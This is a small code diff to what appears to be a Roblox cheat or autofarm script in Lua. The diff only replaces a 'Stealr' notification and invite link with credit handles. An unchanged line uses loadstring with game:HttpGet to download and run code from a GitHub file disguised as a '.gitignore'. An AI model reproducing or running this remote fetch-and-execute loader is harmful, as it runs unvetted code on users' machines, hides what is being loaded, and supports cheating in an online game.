@@ -115,8 +115,8 @@ wait(2)
 loadstring(game:HttpGet"https://github.com/senpaikun123431/AutofarmPrivatev2/blob/main/.gitignore")()
 wait(5)
 OrionLib:MakeNotification({
-	Name = "Stealr #1!",
-	Content = "dsc.gg/stealr",
+	Name = "Credits: Karya#5055 And Benandyager#9031",
+	Content = "",
 	Image = "rbxassetid://4483345998",
 	Time = 5
 })
